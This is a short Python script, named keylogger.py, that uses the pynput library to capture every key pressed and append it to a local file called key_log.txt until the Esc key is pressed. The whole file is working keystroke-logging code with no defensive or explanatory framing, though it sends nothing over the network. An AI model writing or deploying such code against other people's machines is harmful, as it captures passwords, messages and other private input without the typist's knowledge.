# keylogger.py

import pynput
from pynput.keyboard import Key, Listener

# Path to log file
log_file = "key_log.txt"

# Function to handle key presses
def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{key.char}\n")
    except AttributeError:
        with open(log_file, "a") as log:
            log.write(f"{str(key)}\n")

# Function to handle key releases (optional, can be used for special purposes)
def on_release(key):
    if key == Key.esc:  # Stop listener with Esc key
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
